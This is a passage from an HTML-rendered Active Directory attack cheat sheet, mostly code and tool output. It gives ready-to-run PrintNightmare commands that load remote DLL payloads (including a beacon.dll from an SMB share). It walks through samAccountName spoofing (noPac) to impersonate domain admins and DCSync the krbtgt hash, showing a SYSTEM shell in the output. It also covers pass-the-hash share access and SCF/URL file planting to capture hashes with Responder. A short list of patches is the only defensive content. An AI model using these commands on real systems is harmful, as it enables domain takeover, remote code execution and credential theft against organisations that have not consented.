</span></span><span style="display:flex;"><span>python3 ./CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">1675</span>.py hackit.local/domain_user<span style="color:#960050;background-color:#1e0010">:</span>Pass123@192.168.1.10 <span style="color:#e6db74">&#39;C:\addCube.dll&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## LPE</span>
</span></span><span style="display:flex;"><span>SharpPrintNightmare.exe C:\addCube.dll
</span></span><span style="display:flex;"><span><span style="color:#75715e">## RCE using existing context</span>
</span></span><span style="display:flex;"><span>SharpPrintNightmare.exe <span style="color:#e6db74">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span> <span style="color:#e6db74">&#39;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL&#39;</span> <span style="color:#e6db74">&#39;\\192.168.1.20&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## RCE using runas /netonly</span>
</span></span><span style="display:flex;"><span>SharpPrintNightmare.exe <span style="color:#e6db74">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span>  <span style="color:#e6db74">&#39;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&#39;</span> <span style="color:#e6db74">&#39;\\192.168.1.10&#39;</span> hackit.local domain_user Pass123
</span></span></code></pre></div></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">Invoke-Nightmare</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">## LPE only (PS1 + DLL)</span>
</span></span><span style="display:flex;"><span>Import-Module .\cve-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">1675</span>.ps1
</span></span><span style="display:flex;"><span>Invoke-Nightmare <span style="color:#75715e"># add user `adm1n`/`P@ssw0rd` in the local admin group by default</span>
</span></span><span style="display:flex;"><span>Invoke-Nightmare -DriverName <span style="color:#e6db74">&#34;Dementor&#34;</span> -NewUser <span style="color:#e6db74">&#34;d3m3nt0r&#34;</span> -NewPassword <span style="color:#e6db74">&#34;AzkabanUnleashed123*&#34;</span> 
</span></span><span style="display:flex;"><span>Invoke-Nightmare -DLL <span style="color:#e6db74">&#34;C:\absolute\path\to\your\bindshell.dll&#34;</span>
</span></span></code></pre></div></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/releases">Mimikatz v2.2.0-20210709+</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">## LPE</span>
</span></span><span style="display:flex;"><span>misc::printnightmare /server<span style="color:#960050;background-color:#1e0010">:</span>DC01 /library<span style="color:#960050;background-color:#1e0010">:</span>C:\Users\user1\Documents\mimispool.dll
</span></span><span style="display:flex;"><span><span style="color:#75715e">## RCE</span>
</span></span><span style="display:flex;"><span>misc::printnightmare /server<span style="color:#960050;background-color:#1e0010">:</span>CASTLE /library<span style="color:#960050;background-color:#1e0010">:</span>\\<span style="color:#ae81ff">10.0</span>.2.<span style="color:#ae81ff">12</span>\smb\beacon.dll /authdomain<span style="color:#960050;background-color:#1e0010">:</span>LAB /authuser<span style="color:#960050;background-color:#1e0010">:</span>Username /authpassword<span style="color:#960050;background-color:#1e0010">:</span>Password01 /<span style="color:#66d9ef">try</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">50</span>
</span></span></code></pre></div></li>
<li><a href="https://github.com/outflanknl/PrintNightmare">PrintNightmare - @outflanknl</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PrintNightmare [<span style="color:#66d9ef">target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password</span>]
</span></span></code></pre></div></li>
</ul>
<p><strong>Debug informations</strong></p>
<table>
<thead>
<tr>
<th>Error</th>
<th>Message</th>
<th>Debug</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x5</td>
<td><code>rpc_s_access_denied</code></td>
<td>Permissions on the file in the SMB share</td>
</tr>
<tr>
<td>0x525</td>
<td><code>ERROR_NO_SUCH_USER</code></td>
<td>The specified account does not exist.</td>
</tr>
<tr>
<td>0x180</td>
<td>unknown error code</td>
<td>Share is not SMB2</td>
</tr>
</tbody>
</table>
<h4 id="samaccountname-spoofing">
  samAccountName spoofing
  <a class="anchor" href="#samaccountname-spoofing">#</a>
</h4>
<blockquote>
<p>During S4U2Self, the KDC will try to append a &lsquo;$&rsquo; to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller&rsquo;s sAMAccountName - without the &lsquo;$&rsquo;. For instance, suppose there is a domain controller with a sAMAccountName set to &lsquo;DC$&rsquo;. An attacker would then create a machine account with the sAMAccountName set to &lsquo;DC&rsquo;. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to &lsquo;DC&rsquo; has been renamed, the KDC will try to find the machine account by appending a &lsquo;$&rsquo;, which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.</p>
</blockquote>
<p><strong>Requirements</strong></p>
<ul>
<li>MachineAccountQuota &gt; 0</li>
</ul>
<p><strong>Check for exploitation</strong></p>
<ol start="0">
<li>Check the MachineAccountQuota of the account</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec ldap <span style="color:#ae81ff">10.10</span>.10.10 -u username -p <span style="color:#e6db74">&#39;Password123&#39;</span> -d <span style="color:#e6db74">&#39;domain.local&#39;</span> --kdcHost <span style="color:#ae81ff">10.10</span>.10.10 -M MAQ
</span></span><span style="display:flex;"><span>StandIn.exe --object ms-DS-MachineAccountQuota=*
</span></span></code></pre></div><ol>
<li>Check if the DC is vulnerable</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -d domain -M nopac
</span></span></code></pre></div><p><strong>Exploitation</strong></p>
<ol start="0">
<li>Create a computer account
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>impacket@linux&gt; addcomputer.py -computer-name <span style="color:#e6db74">&#39;ControlledComputer$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;ComputerPassword&#39;</span> -dc-host DC01 -domain-netbios domain <span style="color:#e6db74">&#39;domain.local/user1:complexpassword&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powermad@windows&gt; . .\Powermad.ps1
</span></span><span style="display:flex;"><span>powermad@windows&gt; $password = ConvertTo-SecureString <span style="color:#e6db74">&#39;ComputerPassword&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>powermad@windows&gt; New-MachineAccount -MachineAccount <span style="color:#e6db74">&#34;ControlledComputer&#34;</span> -Password $($password) -Domain <span style="color:#e6db74">&#34;domain.local&#34;</span> -DomainController <span style="color:#e6db74">&#34;DomainController.domain.local&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sharpmad@windows&gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
</span></span></code></pre></div></li>
<li>Clear the controlled machine account <code>servicePrincipalName</code> attribute
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>impacket@linux&gt; addspn.py -u <span style="color:#e6db74">&#39;domain\user&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> -t <span style="color:#e6db74">&#39;ControlledComputer$&#39;</span> -c DomainController
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powershell@windows&gt; . .\Powerview.ps1
</span></span><span style="display:flex;"><span>powershell@windows&gt; Set-DomainObject <span style="color:#e6db74">&#34;CN=ControlledComputer,CN=Computers,DC=domain,DC=local&#34;</span> -Clear <span style="color:#e6db74">&#39;serviceprincipalname&#39;</span> -Verbose
</span></span></code></pre></div></li>
<li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller&rsquo;s name without the trailing <code>$</code>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/SecureAuthCorp/impacket/pull/1224</span>
</span></span><span style="display:flex;"><span>impacket@linux&gt; renameMachine.py -current-name <span style="color:#e6db74">&#39;ControlledComputer$&#39;</span> -new-name <span style="color:#e6db74">&#39;DomainController&#39;</span> -dc-ip <span style="color:#e6db74">&#39;DomainController.domain.local&#39;</span> <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;password&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powermad@windows&gt; Set-MachineAccountAttribute -MachineAccount <span style="color:#e6db74">&#34;ControlledComputer&#34;</span> -Value <span style="color:#e6db74">&#34;DomainController&#34;</span> -Attribute samaccountname -Verbose
</span></span></code></pre></div></li>
<li>Request a TGT for the controlled machine account
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>impacket@linux&gt; getTGT.py -dc-ip <span style="color:#e6db74">&#39;DomainController.domain.local&#39;</span> <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;DomainController&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;ComputerPassword&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd@windows&gt; Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DomainController&#34;</span> /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;ComputerPassword&#34;</span> /domain<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;domain.local&#34;</span> /dc<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DomainController.domain.local&#34;</span> /nowrap
</span></span></code></pre></div></li>
<li>Reset the controlled machine account sAMAccountName to its old value
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>impacket@linux&gt; renameMachine.py -current-name <span style="color:#e6db74">&#39;DomainController&#39;</span> -new-name <span style="color:#e6db74">&#39;ControlledComputer$&#39;</span> <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;password&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powermad@windows&gt; Set-MachineAccountAttribute -MachineAccount <span style="color:#e6db74">&#34;ControlledComputer&#34;</span> -Value <span style="color:#e6db74">&#34;ControlledComputer&#34;</span> -Attribute samaccountname -Verbose
</span></span></code></pre></div></li>
<li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/SecureAuthCorp/impacket/pull/1202</span>
</span></span><span style="display:flex;"><span>impacket@linux&gt; KRB5CCNAME=<span style="color:#e6db74">&#39;DomainController.ccache&#39;</span> getST.py -self -impersonate <span style="color:#e6db74">&#39;DomainAdmin&#39;</span> -spn <span style="color:#e6db74">&#39;cifs/DomainController.domain.local&#39;</span> -k -no-pass -dc-ip <span style="color:#e6db74">&#39;DomainController.domain.local&#39;</span> <span style="color:#e6db74">&#39;domain.local&#39;</span>/<span style="color:#e6db74">&#39;DomainController&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd@windows&gt; Rubeus.exe s4u /self /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DomainAdmin&#34;</span> /altservice<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;ldap/DomainController.domain.local&#34;</span> /dc<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DomainController.domain.local&#34;</span> /ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">Base64 TGT</span>]
</span></span></code></pre></div></li>
<li>DCSync: <code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'</code></li>
</ol>
<p>Automated exploitation:</p>
<ul>
<li><a href="https://github.com/cube0x0/noPac">noPac - @cube0x0</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>noPac.exe scan -domain htb.local -user user -pass <span style="color:#e6db74">&#39;password123&#39;</span>
</span></span><span style="display:flex;"><span>noPac.exe -domain htb.local -user domain_user -pass <span style="color:#e6db74">&#39;Password123!&#39;</span> /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
</span></span><span style="display:flex;"><span>noPac.exe -domain htb.local -user domain_user -pass <span style="color:#e6db74">&#34;Password123!&#34;</span> /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
</span></span></code></pre></div></li>
<li><a href="https://github.com/WazeHell/sam-the-admin">sam_the_admin - @WazeHell</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ python3 sam_the_admin.py <span style="color:#e6db74">&#34;caltech/alice.cassie:Lee@tPass&#34;</span> -dc-ip <span style="color:#ae81ff">192.168</span>.1.110 -shell
</span></span><span style="display:flex;"><span>[*] Selected Target dc.caltech.white                                              
</span></span><span style="display:flex;"><span>[*] Total Domain Admins <span style="color:#ae81ff">11</span>                                                        
</span></span><span style="display:flex;"><span>[*] will <span style="color:#66d9ef">try</span> to impersonat gaylene.dreddy                                         
</span></span><span style="display:flex;"><span>[*] Current ms-DS-MachineAccountQuota = <span style="color:#ae81ff">10</span>                                        
</span></span><span style="display:flex;"><span>[*] Adding Computer Account <span style="color:#e6db74">&#34;SAMTHEADMIN-11$&#34;</span>                                     
</span></span><span style="display:flex;"><span>[*] MachineAccount <span style="color:#e6db74">&#34;SAMTHEADMIN-11$&#34;</span> password = EhFMT<span style="color:#66d9ef">%</span>mzmACL                      
</span></span><span style="display:flex;"><span>[*] Successfully added machine account SAMTHEADMIN-<span style="color:#ae81ff">11</span>$ with password EhFMT<span style="color:#66d9ef">%</span>mzmACL.
</span></span><span style="display:flex;"><span>[*] SAMTHEADMIN-<span style="color:#ae81ff">11</span>$ object = CN=SAMTHEADMIN-<span style="color:#ae81ff">11</span>,CN=Computers,DC=caltech,DC=white   
</span></span><span style="display:flex;"><span>[*] SAMTHEADMIN-<span style="color:#ae81ff">11</span>$ sAMAccountName == dc                                          
</span></span><span style="display:flex;"><span>[*] Saving ticket <span style="color:#66d9ef">in</span> dc.ccache                                                    
</span></span><span style="display:flex;"><span>[*] Resting the machine account to SAMTHEADMIN-<span style="color:#ae81ff">11</span>$                                
</span></span><span style="display:flex;"><span>[*] Restored SAMTHEADMIN-<span style="color:#ae81ff">11</span>$ sAMAccountName to original value                     
</span></span><span style="display:flex;"><span>[*] Using TGT from cache                                                          
</span></span><span style="display:flex;"><span>[*] Impersonating gaylene.dreddy                                                  
</span></span><span style="display:flex;"><span>[*]     Requesting S4U2self                                                       
</span></span><span style="display:flex;"><span>[*] Saving ticket <span style="color:#66d9ef">in</span> gaylene.dreddy.ccache                                        
</span></span><span style="display:flex;"><span>[!] Launching semi-interactive shell - Careful what you execute                   
</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami                                                        
</span></span><span style="display:flex;"><span>nt authority\system 
</span></span></code></pre></div></li>
<li><a href="https://github.com/ly4k/Pachine">Pachine - @ly4k</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>usage<span style="color:#960050;background-color:#1e0010">:</span> pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>,<span style="color:#ae81ff">636</span>}] [-baseDN DC=test,DC=local]
</span></span><span style="display:flex;"><span>              [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH<span style="color:#960050;background-color:#1e0010">:</span>NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
</span></span><span style="display:flex;"><span>              [domain/]username[<span style="color:#960050;background-color:#1e0010">:</span>password]
</span></span><span style="display:flex;"><span>$ python3 pachine.py -dc-host dc.predator.local -scan <span style="color:#e6db74">&#39;predator.local/john:Passw0rd!&#39;</span>
</span></span><span style="display:flex;"><span>$ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator <span style="color:#e6db74">&#39;predator.local/john:Passw0rd!&#39;</span>
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME=$PWD/administrator@predator.local.ccache
</span></span><span style="display:flex;"><span>$ impacket-psexec -k -no-pass <span style="color:#e6db74">&#39;predator.local/administrator@dc.predator.local&#39;</span>
</span></span></code></pre></div></li>
</ul>
<p><strong>Mitigations</strong>:</p>
<ul>
<li><a href="https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520">KB5007247 - Windows Server 2012 R2</a></li>
<li><a href="https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9">KB5008601 - Windows Server 2016</a></li>
<li><a href="https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7">KB5008602 - Windows Server 2019</a></li>
<li><a href="https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31">KB5007205 - Windows Server 2022</a></li>
<li><a href="https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e">KB5008102</a></li>
<li><a href="https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041">KB5008380</a></li>
</ul>
<h3 id="open-shares">
  Open Shares
  <a class="anchor" href="#open-shares">#</a>
</h3>
<blockquote>
<p>Some shares can be accessible without authentication, explore them to find some juicy files</p>
</blockquote>
<ul>
<li>
<p><a href="https://github.com/ShawnDEvans/smbmap">smbmap</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>smbmap -H <span style="color:#ae81ff">10.10</span>.10.10                <span style="color:#75715e"># null session</span>
</span></span><span style="display:flex;"><span>smbmap -H <span style="color:#ae81ff">10.10</span>.10.10 -R             <span style="color:#75715e"># recursive listing</span>
</span></span><span style="display:flex;"><span>smbmap -H <span style="color:#ae81ff">10.10</span>.10.10 -u invaliduser <span style="color:#75715e"># guest smb session</span>
</span></span><span style="display:flex;"><span>smbmap -H <span style="color:#ae81ff">10.10</span>.10.10 -d <span style="color:#e6db74">&#34;DOMAIN.LOCAL&#34;</span> -u <span style="color:#e6db74">&#34;USERNAME&#34;</span> -p <span style="color:#e6db74">&#34;Password123*&#34;</span>
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/byt3bl33d3r/pth-toolkit">pth-smbclient from path-toolkit</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pth-smbclient -U <span style="color:#e6db74">&#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&#34;</span> //<span style="color:#ae81ff">192.168</span>.10.<span style="color:#ae81ff">100</span>/Share
</span></span><span style="display:flex;"><span>pth-smbclient -U <span style="color:#e6db74">&#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&#34;</span> //<span style="color:#ae81ff">192.168</span>.10.<span style="color:#ae81ff">100</span>/C$
</span></span><span style="display:flex;"><span>ls  <span style="color:#75715e"># list files</span>
</span></span><span style="display:flex;"><span>cd  <span style="color:#75715e"># move inside a folder</span>
</span></span><span style="display:flex;"><span>get <span style="color:#75715e"># download files</span>
</span></span><span style="display:flex;"><span>put <span style="color:#75715e"># replace a file</span>
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket">smbclient from Impacket</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>smbclient -I <span style="color:#ae81ff">10.10</span>.10.100 -L ACTIVE -N -U <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
</span></span><span style="display:flex;"><span>        ---------       ----      -------
</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>        C$              Disk      <span style="color:#66d9ef">Default</span> share
</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
</span></span><span style="display:flex;"><span>        Replication     Disk      
</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
</span></span><span style="display:flex;"><span>        Users           Disk
</span></span><span style="display:flex;"><span>use Sharename <span style="color:#75715e"># select a Sharename</span>
</span></span><span style="display:flex;"><span>cd Folder     <span style="color:#75715e"># move inside a folder</span>
</span></span><span style="display:flex;"><span>ls            <span style="color:#75715e"># list files</span>
</span></span></code></pre></div></li>
<li>
<p><a href="#">smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>smbclient -U username //<span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span>/SYSVOL
</span></span><span style="display:flex;"><span>smbclient //<span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span>/Share
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download a folder recursively</span>
</span></span><span style="display:flex;"><span>smb<span style="color:#960050;background-color:#1e0010">:</span> \&gt; mask <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>smb<span style="color:#960050;background-color:#1e0010">:</span> \&gt; recurse ON
</span></span><span style="display:flex;"><span>smb<span style="color:#960050;background-color:#1e0010">:</span> \&gt; prompt OFF
</span></span><span style="display:flex;"><span>smb<span style="color:#960050;background-color:#1e0010">:</span> \&gt; lcd <span style="color:#e6db74">&#39;/path/to/go/&#39;</span>
</span></span><span style="display:flex;"><span>smb<span style="color:#960050;background-color:#1e0010">:</span> \&gt; mget *
</span></span></code></pre></div></li>
</ul>
<h3 id="scf-and-url-file-attack-against-writeable-share">
  SCF and URL file attack against writeable share
  <a class="anchor" href="#scf-and-url-file-attack-against-writeable-share">#</a>
</h3>
<p>Theses attacks can be automated with <a href="https://github.com/mdsecactivebreach/Farmer">Farmer.exe</a> and <a href="https://github.com/mdsecactivebreach/Farmer/tree/main/crop">Crop.exe</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Farmer to receive auth</span>
</span></span><span style="display:flex;"><span>farmer.exe &lt;port&gt; [<span style="color:#66d9ef">seconds] [output</span>]
</span></span><span style="display:flex;"><span>farmer.exe <span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">0</span> c:\windows\temp\test.tmp <span style="color:#75715e"># undefinitely</span>
</span></span><span style="display:flex;"><span>farmer.exe <span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">60</span> <span style="color:#75715e"># one minute</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks</span>
</span></span><span style="display:flex;"><span>crop.exe &lt;output folder&gt; &lt;output filename&gt; &lt;WebDAV server&gt; &lt;LNK value&gt; [<span style="color:#66d9ef">options</span>]
</span></span><span style="display:flex;"><span>Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
</span></span><span style="display:flex;"><span>Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
</span></span></code></pre></div><h4 id="scf-files">
  SCF Files
  <a class="anchor" href="#scf-files">#</a>
</h4>
<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">Shell</span>]
</span></span><span style="display:flex;"><span>Command=<span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>IconFile=\\<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>\Share\test.ico
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Taskbar</span>]
</span></span><span style="display:flex;"><span>Command=ToggleDesktop
</span></span></code></pre></div><p>Using <a href="https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/slinky.py"><code>crackmapexec</code></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER <span style="color:#75715e">#scf</span>
</span></span><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER <span style="color:#75715e">#lnk</span>
</span></span><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
</span></span></code></pre></div><h4 id="url-files">
  URL Files
  <a class="anchor" href="#url-files">#</a>
</h4>
<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">InternetShortcut</span>]
</span></span><span style="display:flex;"><span>URL=whatever
</span></span><span style="display:flex;"><span>WorkingDirectory=whatever
</span></span><span style="display:flex;"><span>IconFile=\\<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>\<span style="color:#66d9ef">%</span>USERNAME%.icon
</span></span><span style="display:flex;"><span>IconIndex=<span style="color:#ae81ff">1</span>
</span></span></code></pre></div><h4 id="windows-library-files">
  Windows Library Files
  <a class="anchor" href="#windows-library-files">#</a>
</h4>
<blockquote>
<p>Windows Library Files (.library-ms)</p>
</blockquote>
